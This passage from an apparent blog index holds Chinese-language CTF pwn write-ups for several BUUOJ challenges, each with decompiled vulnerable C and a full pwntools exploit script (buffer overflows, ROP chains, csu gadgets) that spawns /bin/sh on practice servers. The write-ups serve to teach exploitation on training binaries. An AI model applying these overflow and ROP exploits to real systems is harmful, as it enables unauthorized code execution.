class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(mem_addr) + <span class="string">&#x27;aaaabbbb&#x27;</span> <span class="comment">#返回地址设为shellcode所在的地址</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;me?\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>64bit</tag>
        <tag>shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_n_8</title>
    <url>/ciscn_2019_n_8/</url>
    <content><![CDATA[<h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h1><p>使用checksec查看文件属性，内容如下，禁止覆盖ret，禁止栈执行权限，地址随机化。</p>
<p><img src="/ciscn_2019_n_8/ciscn_2019_n_8(1).png"></p>
<p>用ida打开，查看strings，发现有system和&#x2F;bin&#x2F;sh，代码中应该存在system(‘&#x2F;bin&#x2F;sh’)</p>
<p>查看代码，如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp-14h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp-10h] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  var[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">  var[<span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, var, v4, v5);   <span class="comment">//输入键盘到var数组中，v4和v5好像没用的</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)&amp;var[<span class="number">13</span>] )     <span class="comment">//_QWORD也就是4个字，就是8个字节，这里是指取var数组的第14个数字，并且是以8字节的方式来读，它的值要求不为0</span></span><br><span class="line">  &#123;</span><br><span class="line">​    <span class="keyword">if</span> ( *(_QWORD *)&amp;var[<span class="number">13</span>] == <span class="number">17LL</span> )  <span class="comment">//LL是long long类型，QWORD比较的时候取了8个字节，也就是var[13]var[14]==17LL</span></span><br><span class="line">​      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">​    <span class="keyword">else</span></span><br><span class="line">​      <span class="built_in">printf</span>(</span><br><span class="line">​        <span class="string">&quot;something wrong! val is %d&quot;</span>,</span><br><span class="line">​        var[<span class="number">0</span>],var[<span class="number">1</span>],var[<span class="number">2</span>],var[<span class="number">3</span>],var[<span class="number">4</span>],var[<span class="number">5</span>],var[<span class="number">6</span>],var[<span class="number">7</span>],var[<span class="number">8</span>],var[<span class="number">9</span>],var[<span class="number">10</span>],var[<span class="number">11</span>],var[<span class="number">12</span>],var[<span class="number">13</span>],var[<span class="number">14</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">​    <span class="built_in">printf</span>(<span class="string">&quot;%s, Welcome!\n&quot;</span>, var);</span><br><span class="line">​    <span class="built_in">puts</span>(<span class="string">&quot;Try do something~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/ciscn_2019_n_8/ciscn_2019_n_8(2).png"></p>
<p>var可以看做是一个int型长度为15数组，根据源码得到*(_QWORD *)&amp;var[13] &#x3D;&#x3D; 17就可以得到shell，QWORD是8个字节，所以意思是要将var[13]之后的8个字节的数据赋值为17。dd是4个字节，和int的长度一样，因此可以看成是int类型。</p>
<p>为了要执行shell，需要让var的第14个数字为17</p>
<p>构造payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;local:1/remote:2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">select = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">p=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> select == <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">​	p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> select == <span class="number">2</span>:</span><br><span class="line"></span><br><span class="line">​	p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25815</span>) </span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">13</span>*<span class="number">4</span> + p32(<span class="number">17</span>)  <span class="comment">#字符会被当成一个字节，</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">13</span>*<span class="number">4</span> + p64(<span class="number">17</span>)  <span class="comment">#而p32和p64都会自动占据一个dd，也就是4个字节 </span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#payload = p32(17)*14   这两种也可以</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#payload = p64(17)*14</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>32bit</tag>
        <tag>覆盖修改变量值</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_ne_5</title>
    <url>/ciscn_2019_ne_5/</url>
    <content><![CDATA[<h1 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h1><p><a href="https://blog.csdn.net/qq_41560595/article/details/118860263">https://blog.csdn.net/qq_41560595/article/details/118860263</a></p>
<p><img src="/ciscn_2019_ne_5/ciscn_2019_ne_5(1).png"></p>
<p>查看ida代码，没有mprotect，应该不能用shellcode，有GetFlag函数，各个重要代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+0h] [ebp-100h] BYREF</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">4</span>]; <span class="comment">// [esp+4h] [ebp-FCh] BYREF    //通过addlog函数溢出这个参数，让他变长，每个局部变量的分隔符应该是以参数头分辨的</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">124</span>]; <span class="comment">// [esp+8h] [ebp-F8h] BYREF    //因此只要覆盖了，就会变长，不需要考虑它是否会被限制在4的空间内</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">4</span>]; <span class="comment">// [esp+84h] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">96</span>]; <span class="comment">// [esp+88h] [ebp-78h] BYREF</span></span><br><span class="line">  <span class="type">int</span> *v9; <span class="comment">// [esp+F4h] [ebp-Ch]</span></span><br><span class="line">  </span><br><span class="line">  v9 = &amp;argc;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *(_DWORD *)s1 = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="keyword">sizeof</span>(v8));</span><br><span class="line">  *(_DWORD *)src = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="keyword">sizeof</span>(v6));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to use LFS.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input admin password:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%100s&quot;</span>, s1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;administrator&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">​    <span class="built_in">puts</span>(<span class="string">&quot;Password Error!&quot;</span>);</span><br><span class="line">​    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your operation:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Add a log.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Display all logs.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Print all logs.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0.Exit\n:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">switch</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">​    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">​      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">​      <span class="keyword">return</span> result;</span><br><span class="line">​    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">​      AddLog(src);</span><br><span class="line">​      result = sub_804892B(argc, argv, envp);</span><br><span class="line">​      <span class="keyword">break</span>;</span><br><span class="line">​    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">​      Display(src);</span><br><span class="line">​      result = sub_804892B(argc, argv, envp);</span><br><span class="line">​      <span class="keyword">break</span>;</span><br><span class="line">​    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">​      Print();</span><br><span class="line">​      result = sub_804892B(argc, argv, envp);</span><br><span class="line">​      <span class="keyword">break</span>;</span><br><span class="line">​    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">​      GetFlag(src);</span><br><span class="line">​      result = sub_804892B(argc, argv, envp);</span><br><span class="line">​      <span class="keyword">break</span>;</span><br><span class="line">​    <span class="keyword">default</span>:</span><br><span class="line">​      result = sub_804892B(argc, argv, envp);</span><br><span class="line">​      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">AddLog</span><span class="params">(<span class="type">int</span> a1)</span>     <span class="comment">//通过该函数溢出src数组，让他变的更长</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input new log info:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __isoc99_scanf(<span class="string">&quot;%128s&quot;</span>, a1);  <span class="comment">//存在溢出点，读取128字符，这个参数声明长度为4，但无法溢出到ret</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">GetFlag</span><span class="params">(<span class="type">char</span> *src)</span>      </span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">60</span>]; <span class="comment">// [esp+4h] [ebp-44h] BYREF</span></span><br><span class="line">  *(_DWORD *)dest = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);             <span class="comment">//存在溢出点，在变长之后的src后，将可以溢出dest了</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;The flag is your log:%s\n&quot;</span>, dest);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>getshell可以使用system(‘&#x2F;bin&#x2F;sh’) system(‘&#x2F;sh’) system(‘sh’) 因此找到的字符串有&#x2F;bin&#x2F;sh、&#x2F;sh或者sh。这里使用ROPgadget找到了，注意在IDA查看字符串的话是找不到的。</p>
<p><img src="/ciscn_2019_ne_5/ciscn_2019_ne_5(2).png"></p>
<p>构造payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27011</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;administrator&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr=<span class="number">0x80484D0</span></span><br><span class="line">sh_addr=<span class="number">0x080482ea</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x4c</span>)+p32(system_addr)+<span class="string">b&#x27;0000&#x27;</span>+p32(sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>32bit</tag>
        <tag>执行system函数</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_es_2</title>
    <url>/ciscn_2019_s_3/</url>
    <content><![CDATA[<h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><p><a href="https://blog.csdn.net/xieyichensss/article/details/116041936">https://blog.csdn.net/xieyichensss/article/details/116041936</a> 参考答案</p>
<p>使用checkse查看文件，发现文件除了禁止栈执行权限之前其他都可以，但以下的做法是可以在地址随机化的情况下做出来</p>
<p><img src="/ciscn_2019_s_3/1.jpg"></p>
<p>使用IDA查看代码，关键代码以及gadget显示如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> vuln();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">signed</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = sys_read(<span class="number">0</span>, buf, <span class="number">0x400</span>uLL);   <span class="comment">//存在溢出点，可以操作程序流</span></span><br><span class="line">  <span class="keyword">return</span> sys_write(<span class="number">1u</span>, buf, <span class="number">0x30</span>uLL);     <span class="comment">//存在打印溢出，buf的长度只为0x10，这里打印了0x30，把栈上的一个地址给暴露了出来</span></span><br><span class="line">&#125;                                 <span class="comment">//虽然地址随机化会让栈的起始地址变随机，但是栈之间的相对地址偏移是不会变的</span></span><br><span class="line">                                   <span class="comment">//可以这么理解，当获取到一个栈地址的时候，知道相对偏移量，就可以知道它的绝对地址了。</span></span><br><span class="line">__int64 <span class="title function_">gadgets</span><span class="params">()</span>      <span class="comment">//里面有很多gadgets，为rdi、rsi、rdx和rax的赋值提供了支持</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">15LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看对应的汇编代码，显示如下</p>
<p><img src="/ciscn_2019_s_3/2.jpg"></p>
<p>main函数有rbp</p>
<p><img src="/ciscn_2019_s_3/3.jpg"></p>
<p>这里直接调用syscall的read和write函数，因此不会存在plt和got表，故不能使用printf、puts、write等函数来打印地址来暴露libc版本。</p>
<p><img src="/ciscn_2019_s_3/4.jpg"></p>
<p>在gadgets函数中，有这样一个gadget， mov rax,3Bh    3Bh就是59，syscall 59号的话就是execve函数，而execve(‘&#x2F;bin&#x2F;sh’,0,0)就可以getshell了。</p>
<p>该文件是64位，传参是rdi、rsi、rdx，因此我们需要控制rdi、rsi、rdx和rax。</p>
<p>首先暴露出main的rbp的地址，使用gdb调试暴露出libc地址</p>
<p><img src="/ciscn_2019_s_3/5.jpg"></p>
<p>在gdb中输入了16个a，就是在0x7fffffffe390   而0x7fffffffe3a0的是当前的rbp的地址，0x7fffffffe3a8是ret地址。</p>
<p>在下一个地址0x7fffffffe3b0中，是栈上存储的储存了一个栈的地址，之所以不使用RBP是因为我们在输入&#x2F;bin&#x2F;sh之后，需要覆盖RBP以及ret继续执行vuln函数，因此RBP会被覆盖的。</p>
<p><img src="/ciscn_2019_s_3/6.jpg"></p>
<p>调试脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.buuoj.cn&#x27;,26227)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>] <span class="comment">#pwndbg适配该终端，加上这句话，我们就可以在一个终端进行分屏调试，分屏的切换一类的操作还需要查看一下tmux如何使用</span></span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">csu_end = <span class="number">0x040059A</span></span><br><span class="line">csu_front = <span class="number">0x0400580</span></span><br><span class="line">ret_addr = <span class="number">0x004003a9</span></span><br><span class="line">rax_59_ret = <span class="number">0x04004E2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b main_addr&#x27;)</span></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x00400503&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + <span class="string">&#x27;A&#x27;</span>*<span class="number">0x8</span> + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;stack_addr--&gt;&#x27;</span> + <span class="built_in">hex</span>(stack_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + <span class="string">&#x27;A&#x27;</span>*<span class="number">0x8</span> +  p64(rax_59_ret) + p64(csu_end)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(csu_front)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br></pre></td></tr></table></figure>



<p>以下是payload，结合payload就能描述整个ROP的过程。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.buuoj.cn&#x27;,28445)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4005a3</span></span><br><span class="line">pop_rbx_addr = <span class="number">0x40059a</span></span><br><span class="line">mov_rdx_addr = <span class="number">0x400580</span></span><br><span class="line">mov_rax_addr = <span class="number">0x4004e2</span></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = p64(0) * 2 + p64(vuln_addr)</span></span><br><span class="line">payload = <span class="string">&#x27;aaaaaaaabbbbbbbb&#x27;</span> + p64(vuln_addr)</span><br><span class="line">p.sendline(payload)    <span class="comment">#暴露出栈的地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x10</span>)</span><br><span class="line">temp0 = p.recv(<span class="number">0x8</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;rbp_addr: &#x27;</span> + <span class="built_in">hex</span>(u64(temp0)))</span><br><span class="line">temp1 = p.recv(<span class="number">0x8</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;get_addr: &#x27;</span> + <span class="built_in">hex</span>(u64(temp1)))</span><br><span class="line">temp = p.recv(<span class="number">0x8</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;get_addr: &#x27;</span> + <span class="built_in">hex</span>(u64(temp)))</span><br><span class="line">binsh_addr = u64(temp) - <span class="number">0x128</span>     <span class="comment">#获取到栈的地址,然后减去调试得到的0x118偏移得到/bin/sh的地址，本地是0x128，远程是0x118</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recv(0x20)</span></span><br><span class="line"><span class="comment">#temp = p.recv(16)</span></span><br><span class="line"><span class="comment">#print(temp)</span></span><br><span class="line"><span class="comment">#print(&#x27;get_addr: &#x27; + p.recv(8))</span></span><br><span class="line"><span class="comment">#binsh_addr =temp + 0x86     #获取到栈的地址,然后减去调试得到的0x118偏移得到/bin/sh的地址</span></span><br><span class="line"><span class="comment">#print(&#x27;binsh_addr : &#x27; + hex(binsh_addr))</span></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#重新进入了主函数,输入/bin/sh</span></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\0&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>) + p64(<span class="number">0</span>)    </span><br><span class="line"></span><br><span class="line"><span class="comment">#覆盖read函数后的ret地址,跳转到__libc_csu_init gadget上，对rbx,rbp,r12,r13,r14,r15进行赋值</span></span><br><span class="line">payload += p64(pop_rbx_addr) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(binsh_addr+<span class="number">0x50</span>) + p64(<span class="number">0</span>)*<span class="number">3</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment">#再覆盖__libc_csu_init gadget后的返回地址retn,跳转到 mov rdx,r13 下一条是mov rsi,r14,这是因为没有pop rdx以及pop rsi,这样可以间接对rdx,rsi进行赋值为0</span></span><br><span class="line">payload += p64(mov_rdx_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#再覆盖mov rdx,r13后的返回地址,跳转到pop rdi,构造execve(“/bin/sh”,0,0) ,赋值rax为59,即0x3B</span></span><br><span class="line">payload += p64(pop_rdi_addr) + p64(binsh_addr) + p64(mov_rax_addr) + p64(syscall_addr)    </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>之所以要对r12进行赋值，是在这部分，它不能直接的赋值为mov_rax的地址，需要用栈做过度，其实这里无所谓是不是一定要mov_rax的，只要跳转的函数有ret，并且里面的push和pop达到平衡，能让我们执行到ret，继续rop即可，这里使用了payload，栈上的mov_rax。</p>
<p><img src="/ciscn_2019_s_3/7.jpg"></p>
<p>执行call [r12],这个函数是执行，r12寄存器中存储的地址的函数（因为rbx等于0嘛），r12内存的是bin_sh_addr+0x50这个地址，这个地址存放的是mov_rax。</p>
<p><img src="/ciscn_2019_s_3/8.png"></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ret2libc</tag>
        <tag>64bit</tag>
        <tag>栈迁移</tag>
      </tags>
  </entry>
  <entry>
    <title>cmcc_simplerop</title>
    <url>/cmcc_simplerop/</url>
    <content><![CDATA[<h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a>cmcc_simplerop</h2><p><img src="/cmcc_simplerop/1.jpg"></p>
<p>使用ida查看主要函数以及字符串，没有发现&#x2F;bin&#x2F;sh</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-14h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ROP is easy is&#x27;nt it ?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your input :&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;v4, <span class="number">100</span>);  <span class="comment">//溢出的长度为80</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/cmcc_simplerop/2.jpg"></p>
<p>查看段，发现bss段可以写，并且有read函数，结合题目，可以猜测构造rop链。</p>
<p>先使用read函数写&#x2F;bin&#x2F;sh到bss段，再使用system函数执行system(‘&#x2F;bin&#x2F;sh’)。</p>
<p>构造payload如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27972</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">int_addr = <span class="number">0x080493e1</span></span><br><span class="line">pop_eax = <span class="number">0x080bae06</span></span><br><span class="line">read_addr= <span class="number">0x0806CD50</span></span><br><span class="line">binsh_addr = <span class="number">0x080EB584</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806e850</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(binsh_addr) + p32(<span class="number">0x8</span>)</span><br><span class="line">payload += p32(pop_eax) + p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(binsh_addr) + p32(int_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>

<p>这道题用libc应该也是可以做的，有puts函数，通过暴露puts函数的地址，得到libc版本再getshell。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>32bit</tag>
        <tag>执行system函数</tag>
        <tag>写bss</tag>
      </tags>
  </entry>
  <entry>
    <title>ez_pz_hackover_2016</title>
    <url>/ez_pz_hackover_2016/</url>
    <content><![CDATA[<h1 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h1><p><img src="/ez_pz_hackover_2016/1.jpg"></p>
<p>保护基本都没有开，可以考虑shellcode。</p>
<p>查看字符串，没有发现&#x2F;bin&#x2F;sh</p>
<p>使用ida查看重要代码</p>
